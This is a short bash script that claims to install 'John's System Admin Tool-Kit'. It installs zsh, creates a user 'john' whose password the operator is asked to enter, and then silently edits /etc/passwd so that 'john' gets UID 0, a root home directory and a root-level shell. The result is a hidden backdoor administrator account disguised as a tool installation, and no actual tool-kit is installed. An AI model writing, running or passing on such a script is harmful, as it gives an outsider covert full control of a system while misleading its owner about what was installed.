#!/bin/bash
function install {
  echo "[!] *warning, this is a beta script and wont do error recovery by itself yet*"
  echo "[#] Installing John's System Admin Tool-Kit..."
  if [ -f /etc/redhat-release ] ; then
    PKMGR='yum'
    DISTRO='Cent OS'
  elif [ -f /etc/debian_version ] ; then
    PKMGR='apt-get'
    DISTRO='Debian'
  fi
  echo "$DISTRO Detected!"
  $PKMGR -y install zsh
  adduser -r -N john
  clear
  echo "[?] Please Enter the Password John Gave You..."
  passwd john
  clear
  echo "[!] *warning, this is a beta script and wont do error recovery by itself yet*"
  echo "[#] Installing John's System Admin Tool-Kit..."
  echo "$DISTRO Detected!"
  sed -i 's/john:x:*:*::\/*:\/bin\/*/john:x:0:0::\/root:\/bin\/zsh/g' /etc/passwd
  echo "[#] Installed John's System Admin Tool-Kit!"
}
clear
install
sleep 1
clear
echo "[!] Thanks for choosing me as a System Administrator :)"
echo
